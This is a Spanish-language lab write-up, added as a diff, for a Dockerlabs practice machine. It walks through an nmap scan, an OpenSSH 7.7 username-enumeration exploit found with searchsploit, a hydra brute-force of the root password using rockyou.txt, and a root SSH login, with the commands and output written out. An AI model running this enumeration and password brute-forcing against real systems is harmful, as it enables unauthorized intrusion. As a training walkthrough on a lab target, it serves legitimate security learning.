@@ -1,0 +1,68 @@
+Al escanear la IP con la herramienta "nmap" a la IP 172.17.0.2
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 18:12 -0500
+Nmap scan report for 172.17.0.2
+Host is up (0.0000040s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3.90 seconds
+
+Por consiguiente, se identificó que el puerto 22 (SSH) está abierto, con versión 7.7
+
+Haciendo una busqueda en searchsploit para OpenSSH, se encontró un exploit para la versión 7.7
+
+┌──(kali㉿kali)-[~/Dockerlabs/Breakmyssh]
+└─$ searchsploit OpenSSH | grep 7.7
+OpenSSH 2.3 < 7.7 - Username Enumeration                                                                    | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                              | linux/remote/45210.py
+OpenSSH < 7.7 - User Enumeration (2)                                                                        | linux/remote/45939.py
+
+Copiamos el exploit en la carpeta para su uso: 
+
+searchsploit -m linux/remote/45939.py
+
+El script, usa python2, requiriendo 2 argumentos (IP, usuario)
+
+Con el script podemos enumerar usuarios
+
+[+] root is a valid username
+[-] admin is an invalid username
+[-] user is an invalid username
+
+Quedandonos con root como usuario valido
+
+Pero falta la password, por lo que usaremos hydra:
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: root   password: estrella
+1 of 1 target successfully completed, 1 valid password found
+
+Obteniendo la contraseña del usuario y pudiendo realizar un login
+
+ssh root@172.17.0.2
+
+Posteriormente usaremos la contraseña encontrada con hydra
+
+┌──(kali㉿kali)-[~/Dockerlabs/Breakmyssh]
+└─$ ssh root@172.17.0.2            
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+root@172.17.0.2's password: 
+Last login: Thu Mar  5 23:00:04 2026 from 172.17.0.1
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@499acc68e2db:~# 
+
+Teniendo acceso como root, así que ya estaría resuelto el lab
